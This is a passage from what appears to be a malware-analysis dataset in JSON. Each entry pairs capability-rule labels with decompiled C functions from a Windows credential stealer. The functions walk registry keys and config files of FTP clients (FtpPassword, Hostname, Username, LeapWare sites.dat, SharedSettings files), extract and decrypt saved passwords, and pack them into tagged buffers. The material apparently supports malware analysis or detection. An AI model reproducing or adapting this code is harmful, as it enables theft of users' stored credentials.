        lpString_00 = fcn.00401b82(*0x4120d5, arg_ch, 0x412fe0, 0);\n            lpString_01 = fcn.00401b82(*0x4120d5, arg_ch, \"HostDirName\", 0);\n            if (((iVar1 != 0) && (lpString != 0)) && (lpString_00 != 0)) {\n                fcn.00401522(arg_8h, 0xbeef0000);\n                fcn.00401584(arg_8h, lpString);\n                fcn.00401584(arg_8h, lpString_00);\n                fcn.00401584(arg_8h, iVar1);\n                fcn.00401584(arg_8h, uVar2);\n                fcn.00401584(arg_8h, lpString_01);\n            }\n            fcn.0040178e(iVar1);\n            fcn.0040178e(lpString);\n            fcn.0040178e(lpString_00);\n            fcn.0040178e(uVar2);\n            fcn.0040178e(lpString_01);\n            fcn.00405f2b(arg_8h, arg_ch);\n            fcn.0040178e(arg_ch);\n            dwIndex = dwIndex + 1;\n        }\n        sub.advapi32.dll_RegCloseKey(phkResult);\n    }\n    return;\n}\n",
        "token_count": 712
    },
    "00406144": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406144(uint arg_8h, uint lpSubKey)\n\n{\n    int32_t iVar1;\n    uint lpString2;\n    uint *hMem;\n    int32_t var_830h;\n    int32_t var_82ch;\n    uint *var_828h;\n    uint var_824h;\n    uint var_820h;\n    int32_t var_81ch;\n    int32_t var_818h;\n    int32_t var_814h;\n    uint var_810h;\n    uint lpName;\n    uint var_ch;\n    int32_t dwIndex;\n    uint phkResult;\n    \n    iVar1 = sub.advapi32.dll_RegOpenKeyA(*0x4120d5, lpSubKey, &phkResult);\n    if (iVar1 == 0) {\n        dwIndex = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = sub.advapi32.dll_RegEnumKeyExA(phkResult, dwIndex, &lpName, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            lpString2 = fcn.00401c09(lpSubKey, 0x4120b1);\n            var_810h = fcn.00401c5d(lpString2, &lpName);\n            var_81ch = fcn.00401b82(*0x4120d5, var_810h, 0x41305a, 0);\n            var_814h = fcn.00401b82(*0x4120d5, var_810h, 0x41304b, 0);\n            var_818h = fcn.00401b82(*0x4120d5, var_810h, 0x413050, 0);\n            var_820h = fcn.00401b82(*0x4120d5, var_810h, \"PthR\", 0);\n            hMem = fcn.00401b82(*0x4120d5, var_810h, 0x413055, &var_82ch);\n            if ((hMem == NULL) || (var_82ch != 4)) {\n                if (hMem != NULL) {\n                    fcn.0040178e(hMem);\n                }\n                var_824h = 0x15;\n            }\n            else {\n                var_824h = *hMem;\n                fcn.0040178e(hMem);\n            }\n            var_828h = fcn.00401b82(*0x4120d5, var_810h, 0x413062, &var_830h);\n            if (((var_81ch != 0) && (var_814h != 0)) && (var_818h != 0)) {\n                fcn.00401522(arg_8h, 0xbeef0010);\n                fcn.00401584(arg_8h, var_814h);\n                fcn.00401584(arg_8h, var_818h);\n                fcn.00401584(arg_8h, var_81ch);\n                fcn.00401522(arg_8h, var_824h);\n                fcn.00401584(arg_8h, var_820h);\n                if ((var_828h == NULL) || (var_830h != 4)) {\n                    fcn.00401522(arg_8h, 0);\n                }\n                else {\n                    fcn.00401522(arg_8h, *var_828h);\n                }\n            }\n            fcn.0040178e(var_81ch);\n            fcn.0040178e(var_814h);\n            fcn.0040178e(var_818h);\n            fcn.0040178e(var_820h);\n            fcn.0040178e(var_828h);\n            fcn.0040178e(var_810h);\n            dwIndex = dwIndex + 1;\n        }\n        sub.advapi32.dll_RegCloseKey(phkResult);\n    }\n    return;\n}\n",
        "token_count": 903
    },
    "004063d6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004063d6(uint arg_8h, uint lpSubKey)\n\n{\n    int32_t iVar1;\n    uint lpString2;\n    uint *hMem;\n    int32_t *hMem_00;\n    int32_t var_834h;\n    int32_t var_830h;\n    int32_t var_82ch;\n    int32_t var_828h;\n    uint var_824h;\n    uint var_820h;\n    int32_t var_81ch;\n    int32_t var_818h;\n    int32_t var_814h;\n    uint var_810h;\n    uint lpName;\n    uint var_ch;\n    int32_t dwIndex;\n    uint phkResult;\n    \n    iVar1 = sub.advapi32.dll_RegOpenKeyA(*0x4120d5, lpSubKey, &phkResult);\n    if (iVar1 == 0) {\n        dwIndex = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = sub.advapi32.dll_RegEnumKeyExA(phkResult, dwIndex, &lpName, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            lpString2 = fcn.00401c09(lpSubKey, 0x4120b1);\n            var_810h = fcn.00401c5d(lpString2, &lpName);\n            var_81ch = fcn.00401b82(*0x4120d5, var_810h, 0x4130e4, &var_834h);\n            var_814h = fcn.00401b82(*0x4120d5, var_810h, 0x4130fa, 0);\n            var_818h = fcn.00401b82(*0x4120d5, var_810h, \"Login\", 0);\n            var_820h = fcn.00401b82(*0x4120d5, var_810h, \"InitialPath\", 0);\n            hMem = fcn.00401b82(*0x4120d5, var_810h, 0x413105, &var_828h);\n            if ((hMem == NULL) || (var_828h != 4)) {\n                var_824h = 0x15;\n            }\n            else {\n                var_824h = *hMem;\n            }\n            fcn.0040178e(hMem);\n            hMem_00 = fcn.00401b82(*0x4120d5, var_810h, \"PasswordType\", &var_830h);\n            if ((hMem_00 == NULL) || (var_830h != 4)) {\n                var_82ch = 0;\n            }\n            else {\n                var_82ch = *hMem_00;\n            }\n            fcn.0040178e(hMem_00);\n            if ((var_81ch != 0) && (var_82ch == 2)) {\n                iVar1 = fcn.004040d7(var_81ch, &var_834h, 0);\n                if ((iVar1 == 0) || (var_834h == 0)) {\n                    fcn.0040178e(var_81ch);\n                    var_81ch = 0;\n                }\n            }\n            if (((var_81ch != 0) && (var_814h != 0)) && (var_818h != 0)) {\n                fcn.00401522(arg_8h, 0xbeef0002);\n                fcn.00401584(arg_8h, var_814h);\n                fcn.00401584(arg_8h, var_818h);\n                fcn.00401558(arg_8h, var_81ch, var_834h);\n                fcn.00401522(arg_8h, var_824h);\n                fcn.00401584(arg_8h, var_820h);\n            }\n            fcn.0040178e(var_81ch);\n            fcn.0040178e(var_814h);\n            fcn.0040178e(var_818h);\n            fcn.0040178e(var_820h);\n            fcn.0040178e(var_810h);\n            dwIndex = dwIndex + 1;\n        }\n        sub.advapi32.dll_RegCloseKey(phkResult);\n    }\n    return;\n}\n",
        "token_count": 986
    },
    "004067a3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004067a3(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    uint uVar3;\n    uint arg_ch_00;\n    char *lpString;\n    char *pcVar4;\n    char *pcVar5;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x11, 0);\n    cVar1 = **0x41205d;\n    lpString = *0x412059;\n    pcVar5 = *0x41205d;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.004015ef(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = sub.shlwapi.dll_StrStrIA();\n        if (iVar2 != 0) {\n            uVar3 = fcn.0040223e(lpString);\n            arg_ch_00 = fcn.00401c5d(uVar3, \"\\\\sites.xml\");\n            uVar3 = arg_8h;\n            fcn.00403d67(arg_8h, arg_ch_00, 0xbeef0000);\n            fcn.0040178e(uVar3);\n        }\n        for (; *lpString != '\\0'; lpString = lpString + 1) {\n        }\n        lpString = lpString + 1;\n        iVar2 = -1;\n        pcVar4 = pcVar5;\n        do {\n            pcVar5 = pcVar4;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar5 = pcVar4 + 1;\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar5;\n        } while (cVar1 != '\\0');\n        cVar1 = *pcVar5;\n    } while( true );\n}\n",
        "token_count": 418
    },
    "00406862": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406862(uint arg_8h, uint lpSubKey)\n\n{\n    int32_t iVar1;\n    uint lpString2;\n    uint *hMem;\n    int32_t var_824h;\n    uint var_820h;\n    int32_t var_81ch;\n    int32_t var_818h;\n    int32_t var_814h;\n    uint var_810h;\n    uint lpName;\n    uint var_ch;\n    int32_t dwIndex;\n    uint phkResult;\n    \n    iVar1 = sub.advapi32.dll_RegOpenKeyA(*0x4120d5, lpSubKey, &phkResult);\n    if (iVar1 == 0) {\n        dwIndex = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = sub.advapi32.dll_RegEnumKeyExA(phkResult, dwIndex, &lpName, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            lpString2 = fcn.00401c09(lpSubKey, 0x4120b1);\n            var_810h = fcn.00401c09(lpString2, &lpName);\n            fcn.0040178e(lpString2);\n            var_81ch = fcn.00401b82(*0x4120d5, var_810h, 0x4131b4, 0);\n            var_814h = fcn.00401b82(*0x4120d5, var_810h, 0x4131a4, 0);\n            var_818h = fcn.00401b82(*0x4120d5, var_810h, 0x4131ab, 0);\n            hMem = fcn.00401b82(*0x4120d5, var_810h, \"FtpPort\", &var_824h);\n            if ((hMem == NULL) || (var_824h != 4)) {\n                if (hMem != NULL) {\n                    fcn.0040178e(hMem);\n                }\n                var_820h = 0x15;\n            }\n            else {\n                var_820h = *hMem;\n                fcn.0040178e(hMem);\n            }\n            if (((var_81ch != 0) && (var_814h != 0)) && (var_818h != 0)) {\n                fcn.00401522(arg_8h, 0xbeef0000);\n                fcn.00401584(arg_8h, var_814h);\n                fcn.00401584(arg_8h, var_818h);\n                fcn.00401584(arg_8h, var_81ch);\n                fcn.00401522(arg_8h, var_820h);\n            }\n            fcn.0040178e(var_81ch);\n            fcn.0040178e(var_814h);\n            fcn.0040178e(var_818h);\n            fcn.0040178e(var_810h);\n            dwIndex = dwIndex + 1;\n        }\n        sub.advapi32.dll_RegCloseKey(phkResult);\n    }\n    return;\n}\n",
        "token_count": 716
    },
    "00406a96": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406a96(uint arg_8h, uint lpSubKey)\n\n{\n    int32_t iVar1;\n    uint lpString2;\n    uint *hMem;\n    int32_t var_828h;\n    int32_t var_824h;\n    uint var_820h;\n    int32_t var_81ch;\n    int32_t var_818h;\n    int32_t var_814h;\n    uint var_810h;\n    uint lpName;\n    uint var_ch;\n    int32_t dwIndex;\n    uint phkResult;\n    \n    iVar1 = sub.advapi32.dll_RegOpenKeyA(*0x4120d5, lpSubKey, &phkResult);\n    if (iVar1 == 0) {\n        dwIndex = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = sub.advapi32.dll_RegEnumKeyExA(phkResult, dwIndex, &lpName, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            lpString2 = fcn.00401c09(lpSubKey, 0x4120b1);\n            var_810h = fcn.00401c09(lpString2, &lpName);\n            fcn.0040178e(lpString2);\n            var_81ch = fcn.00401b82(*0x4120d5, var_810h, 0x41320d, &var_828h);\n            var_814h = fcn.00401b82(*0x4120d5, var_810h, \"Hostname\", 0);\n            var_818h = fcn.00401b82(*0x4120d5, var_810h, \"Username\", 0);\n            hMem = fcn.00401b82(*0x4120d5, var_810h, 0x413216, &var_824h);\n            if ((hMem == NULL) || (var_824h != 4)) {\n                if (hMem != NULL) {\n                    fcn.0040178e(hMem);\n                }\n                var_820h = 0x15;\n            }\n            else {\n                var_820h = *hMem;\n                fcn.0040178e(hMem);\n            }\n            if (((var_81ch != 0) && (var_814h != 0)) && (var_818h != 0)) {\n                iVar1 = fcn.004040d7(var_81ch, &var_828h, 0);\n                if ((iVar1 != 0) && (var_828h != 0)) {\n                    fcn.00401522(arg_8h, 0xbeef0000);\n                    fcn.00401584(arg_8h, var_814h);\n                    fcn.00401584(arg_8h, var_818h);\n                    fcn.00401558(arg_8h, var_81ch, var_828h);\n                    fcn.00401522(arg_8h, var_820h);\n                }\n            }\n            fcn.0040178e(var_81ch);\n            fcn.0040178e(var_814h);\n            fcn.0040178e(var_818h);\n            fcn.0040178e(var_810h);\n            dwIndex = dwIndex + 1;\n        }\n        sub.advapi32.dll_RegCloseKey(phkResult);\n    }\n    return;\n}\n",
        "token_count": 772
    },
    "00406d02": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406d02(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    char *arg_ch_00;\n    int32_t iVar2;\n    uchar *puVar3;\n    char *lpString;\n    uint uVar4;\n    char *pcVar5;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00401d47(arg_ch);\n    if (iVar1 == 0) {\n        return;\n    }\n    iVar1 = fcn.00401e0f(arg_ch, &var_10h);\n    if (iVar1 != 0) {\n        arg_ch_00 = fcn.004017a5(var_4h);\n        fcn.004017dc(var_8h, arg_ch_00, var_4h);\n        lpString = arg_ch_00;\n        while ((*lpString != '\\0' && (iVar1 = sub.shlwapi.dll_StrStrIA(lpString, \"\\\"password\\\" : \\\"\"),  iVar1 != 0))) {\n            iVar2 = sub.kernel32.dll_lstrlenA(\"\\\"password\\\" : \\\"\");\n            lpString = iVar1 + iVar2;\n            puVar3 = sub.shlwapi.dll_StrStrIA(lpString, 0x41325e);\n            if (puVar3 == NULL) break;\n            *puVar3 = 0;\n            uVar4 = arg_8h;\n            pcVar5 = lpString;\n            fcn.00406c8a(arg_8h, lpString);\n            *pcVar5 = uVar4;\n        }\n        fcn.00401522(arg_8h, 0xbeef1001);\n        fcn.00401558(arg_8h, arg_ch_00, var_4h);\n        fcn.0040178e(arg_ch_00);\n        fcn.00401ea4(&var_10h);\n    }\n    return;\n}\n",
        "token_count": 445
    },
    "00406ec3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406ec3(uint arg_8h, uint hKey, uint lpSubKey)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint arg_ch;\n    int32_t lpString;\n    int32_t lpString_00;\n    int32_t lpString_01;\n    uint var_824h;\n    uint var_820h;\n    uint var_81ch;\n    uint var_818h;\n    uint var_814h;\n    uint var_810h;\n    uint lpName;\n    uint var_ch;\n    int32_t dwIndex;\n    uint phkResult;\n    \n    iVar1 = sub.advapi32.dll_RegOpenKeyA(hKey, lpSubKey, &phkResult);\n    if (iVar1 == 0) {\n        dwIndex = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = sub.advapi32.dll_RegEnumKeyExA(phkResult, dwIndex, &lpName, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            uVar2 = fcn.00401c09(lpSubKey, 0x4120b1);\n            arg_ch = fcn.00401c09(uVar2, &lpName);\n            fcn.0040178e(uVar2);\n            iVar1 = fcn.00401b82(hKey, arg_ch, 0x413295, 0);\n            lpString = fcn.00401b82(hKey, arg_ch, \"_Password\", 0);\n            lpString_00 = fcn.00401b82(hKey, arg_ch, \"Server\", 0);\n            lpString_01 = fcn.00401b82(hKey, arg_ch, 0x41328c, 0);\n            uVar2 = fcn.00401b82(hKey, arg_ch, \"Directory\", 0);\n            if ((((iVar1 != 0) || (lpString != 0)) && (lpString_00 != 0)) && (lpString_01 != 0)) {\n                fcn.00401522(arg_8h, 0xbeef0000);\n                fcn.00401584(arg_8h, lpString_00);\n                fcn.00401584(arg_8h, lpString_01);\n                fcn.00401584(arg_8h, iVar1);\n                fcn.00401584(arg_8h, lpString);\n                fcn.00401584(arg_8h, uVar2);\n            }\n            fcn.0040178e(iVar1);\n            fcn.0040178e(lpString);\n            fcn.0040178e(lpString_00);\n            fcn.0040178e(lpString_01);\n            fcn.0040178e(uVar2);\n            fcn.00406ec3(arg_8h, hKey, arg_ch);\n            fcn.0040178e(arg_ch);\n            dwIndex = dwIndex + 1;\n        }\n        sub.advapi32.dll_RegCloseKey(phkResult);\n    }\n    return;\n}\n",
        "token_count": 689
    },
    "004070ee": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004070ee(uint arg_8h, uint hKey, uint lpSubKey)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint arg_ch;\n    int32_t lpString;\n    int32_t lpString_00;\n    int32_t lpString_01;\n    uint var_824h;\n    uint var_820h;\n    uint var_81ch;\n    uint var_818h;\n    uint var_814h;\n    uint var_810h;\n    uint lpName;\n    uint var_ch;\n    int32_t dwIndex;\n    uint phkResult;\n    \n    iVar1 = sub.advapi32.dll_RegOpenKeyA(hKey, lpSubKey, &phkResult);\n    if (iVar1 == 0) {\n        dwIndex = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = sub.advapi32.dll_RegEnumKeyExA(phkResult, dwIndex, &lpName, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            uVar2 = fcn.00401c09(lpSubKey, 0x4120b1);\n            arg_ch = fcn.00401c09(uVar2, &lpName);\n            fcn.0040178e(uVar2);\n            iVar1 = fcn.00401b82(hKey, arg_ch, \"FtpPassword\", 0);\n            lpString = fcn.00401b82(hKey, arg_ch, \"_FtpPassword\", 0);\n            lpString_00 = fcn.00401b82(hKey, arg_ch, \"FtpServer\", 0);\n            lpString_01 = fcn.00401b82(hKey, arg_ch, \"FtpUserName\", 0);\n            uVar2 = fcn.00401b82(hKey, arg_ch, \"FtpDirectory\", 0);\n            if ((((iVar1 != 0) || (lpString != 0)) && (lpString_00 != 0)) && (lpString_01 != 0)) {\n                fcn.00401522(arg_8h, 0xbeef0000);\n                fcn.00401584(arg_8h, lpString_00);\n                fcn.00401584(arg_8h, lpString_01);\n                fcn.00401584(arg_8h, iVar1);\n                fcn.00401584(arg_8h, lpString);\n                fcn.00401584(arg_8h, uVar2);\n            }\n            fcn.0040178e(iVar1);\n            fcn.0040178e(lpString);\n            fcn.0040178e(lpString_00);\n            fcn.0040178e(lpString_01);\n            fcn.0040178e(uVar2);\n            fcn.004070ee(arg_8h, hKey, arg_ch);\n            fcn.0040178e(arg_ch);\n            dwIndex = dwIndex + 1;\n        }\n        sub.advapi32.dll_RegCloseKey(phkResult);\n    }\n    return;\n}\n",
        "token_count": 690
    },
    "00407319": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407319(uint arg_8h, uint hKey, uint lpSubKey)\n\n{\n    int32_t iVar1;\n    int32_t var_814h;\n    int32_t var_810h;\n    uint lpValueName;\n    uint var_ch;\n    int32_t dwIndex;\n    uint phkResult;\n    \n    iVar1 = sub.advapi32.dll_RegOpenKeyA(hKey, lpSubKey, &phkResult);\n    if (iVar1 == 0) {\n        dwIndex = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = sub.advapi32.dll_RegEnumValueA(phkResult, dwIndex, &lpValueName, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            var_810h = fcn.00401b82(hKey, lpSubKey, &lpValueName, &var_814h);\n            if ((var_810h != 0) && (var_814h != 0)) {\n                fcn.00403d12(arg_8h, var_810h, var_814h, 0xbeef0000);\n            }\n            fcn.0040178e(var_810h);\n            dwIndex = dwIndex + 1;\n        }\n        sub.advapi32.dll_RegCloseKey(phkResult);\n    }\n    return;\n}\n",
        "token_count": 315
    },
    "004074dd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004074dd(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t var_4h;\n    \n    var_4h = fcn.00401cc2(arg_ch);\n    if (var_4h != 0) {\n        if (arg_10h != 0) {\n            var_4h = fcn.00401c5d(var_4h, arg_10h);\n        }\n        uVar1 = fcn.00401c09(var_4h, \"\\\\SharedSettings.ccs\");\n        uVar2 = arg_8h;\n        fcn.00403d67(arg_8h, uVar1, 0xbeef0000);\n        fcn.0040178e(uVar2);\n        uVar1 = fcn.00401c09(var_4h, \"\\\\SharedSettings.sqlite\");\n        uVar2 = arg_8h;\n        fcn.00403d67(arg_8h, uVar1, 0xbeef0001);\n        fcn.0040178e(uVar2);\n        uVar1 = fcn.00401c09(var_4h, \"\\\\SharedSettings_1_0_5.ccs\");\n        uVar2 = arg_8h;\n        fcn.00403d67(arg_8h, uVar1, 0xbeef0000);\n        fcn.0040178e(uVar2);\n        uVar2 = fcn.00401c09(var_4h, \"\\\\SharedSettings_1_0_5.sqlite\");\n        fcn.00403d67(arg_8h, uVar2, 0xbeef0001);\n        fcn.0040178e(arg_8h);\n        fcn.0040178e(var_4h);\n    }\n    return;\n}\n",
        "token_count": 413
    },
    "0040760f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040760f(uint arg_8h, uint hKey, uint lpSubKey)\n\n{\n    int32_t iVar1;\n    uint lpString2;\n    uint arg_ch;\n    int32_t arg_ch_00;\n    uint var_818h;\n    uint var_814h;\n    uint var_810h;\n    uint lpName;\n    uint var_ch;\n    int32_t dwIndex;\n    uint phkResult;\n    \n    iVar1 = sub.advapi32.dll_RegOpenKeyA(hKey, lpSubKey, &phkResult);\n    if (iVar1 == 0) {\n        dwIndex = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = sub.advapi32.dll_RegEnumKeyExA(phkResult, dwIndex, &lpName, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            lpString2 = fcn.00401c09(lpSubKey, 0x4120b1);\n            arg_ch = fcn.00401c09(lpString2, &lpName);\n            fcn.0040178e(lpString2);\n            iVar1 = fcn.00401b82(hKey, arg_ch, \"InstallPath\", 0);\n            arg_ch_00 = fcn.00401b82(hKey, arg_ch, 0x41347a, 0);\n            if (iVar1 != 0) {\n                fcn.0040404c(arg_8h, iVar1, \"sites.dat\", 0xbeef0000);\n                fcn.0040404c(arg_8h, iVar1, 0x413440, 0xbeef0001);\n            }\n            if (arg_ch_00 != 0) {\n                fcn.0040404c(arg_8h, arg_ch_00, \"sites.dat\", 0xbeef0000);\n                fcn.0040404c(arg_8h, arg_ch_00, 0x413440, 0xbeef0001);\n            }\n            fcn.0040178e(iVar1);\n            fcn.0040178e(arg_ch_00);\n            fcn.0040760f(arg_8h, hKey, arg_ch);\n            fcn.0040178e(arg_ch);\n            dwIndex = dwIndex + 1;\n        }\n        sub.advapi32.dll_RegCloseKey(phkResult);\n    }\n    return;\n}\n",
        "token_count": 545
    },
    "004077c6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004077c6(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    uint uVar3;\n    char *lpString;\n    char *pcVar4;\n    uint uVar5;\n    char *pcVar6;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x1b, 0);\n    cVar1 = **0x41205d;\n    lpString = *0x412059;\n    pcVar4 = *0x41205d;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.0040777a(arg_8h, 0x1a);\n            fcn.0040777a(arg_8h, 0x23);\n            fcn.0040777a(arg_8h, 0x1c);\n            fcn.0040760f(arg_8h, *0x4120d5, \"SOFTWARE\\\\LeapWare\");\n            fcn.0040760f(arg_8h, 0x80000002, \"SOFTWARE\\\\LeapWare\");\n            fcn.004015ef(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = sub.shlwapi.dll_StrStrA();\n        if (iVar2 == 0) {\n            iVar2 = sub.shlwapi.dll_StrStrIA();\n            if (iVar2 != 0) {\n                uVar3 = fcn.0040223e(lpString);\n                uVar5 = arg_8h;\n                fcn.0040404c(arg_8h, uVar3, \"sites.dat\", 0xbeef0000);\n                uVar3 = arg_8h;\n                fcn.0040404c(arg_8h, uVar5, 0x413440, 0xbeef0001);\n                fcn.0040178e(uVar3);\n            }\n        }\n        else if (*(iVar2 + 1) != '\\0') {\n            pcVar6 = \"unleap.exe\";\n            iVar2 = sub.kernel32.dll_lstrlenA(\"unleap.exe\", iVar2 + 1);\n            uVar3 = fcn.0040223e(pcVar6 + iVar2);\n            uVar5 = arg_8h;\n            fcn.0040404c(arg_8h, uVar3, \"sites.dat\", 0xbeef0000);\n            uVar3 = arg_8h;\n            fcn.0040404c(arg_8h, uVar5, 0x413440, 0xbeef0001);\n            fcn.0040178e(uVar3);\n        }\n        for (; *lpString != '\\0'; lpString = lpString + 1) {\n        }\n        lpString = lpString + 1;\n        iVar2 = -1;\n        pcVar6 = pcVar4;\n        do {\n            pcVar4 = pcVar6;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar4 = pcVar6 + 1;\n            cVar1 = *pcVar6;\n            pcVar6 = pcVar4;\n        } while (cVar1 != '\\0');\n        cVar1 = *pcVar4;\n    } while( true );\n}\n",
        "token_count": 733
    },
    "004078fd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004078fd(uint arg_8h, uint hKey, uint lpSubKey)\n\n{\n    int32_t iVar1;\n    uint lpString2;\n    uint *hMem;\n    int32_t var_830h;\n    uint *var_82ch;\n    uint var_828h;\n    uint var_824h;\n    int32_t var_820h;\n    int32_t var_81ch;\n    int32_t var_818h;\n    int32_t var_814h;\n    uint var_810h;\n    uint lpName;\n    uint var_ch;\n    int32_t dwIndex;\n    uint phkResult;\n    \n    iVar1 = sub.advapi32.dll_RegOpenKeyA(hKey, lpSubKey, &phkResult);\n    if (iVar1 == 0) {\n        dwIndex = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = sub.advapi32.dll_RegEnumKeyExA(phkResult, dwIndex, &lpName, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            lpString2 = fcn.00401c09(lpSubKey, 0x4120b1);\n            var_810h = fcn.00401c09(lpString2, &lpName);\n            fcn.0040178e(lpString2);\n            var_81ch = fcn.00401b82(hKey, var_810h, 0x413482, 0);\n            var_814h = fcn.00401b82(hKey, var_810h, 0x41348b, 0);\n            var_818h = fcn.00401b82(hKey, var_810h, 0x413494, 0);\n            var_824h = fcn.00401b82(hKey, var_810h, \"RemoteDirectory\", 0);\n            hMem = fcn.00401b82(*0x4120d5, var_810h, 0x4134ad, &var_820h);\n            if ((hMem == NULL) || (var_820h != 4)) {\n                if (hMem != NULL) {\n                    fcn.0040178e(hMem);\n                }\n                var_828h = 0x15;\n            }\n            else {\n                var_828h = *hMem;\n                fcn.0040178e(hMem);\n            }\n            var_82ch = fcn.00401b82(hKey, var_810h, \"FSProtocol\", &var_830h);\n            if (((var_81ch != 0) && (var_814h != 0)) && (var_818h != 0)) {\n                fcn.00401522(arg_8h, 0xbeef0010);\n                fcn.00401584(arg_8h, var_814h);\n                fcn.00401584(arg_8h, 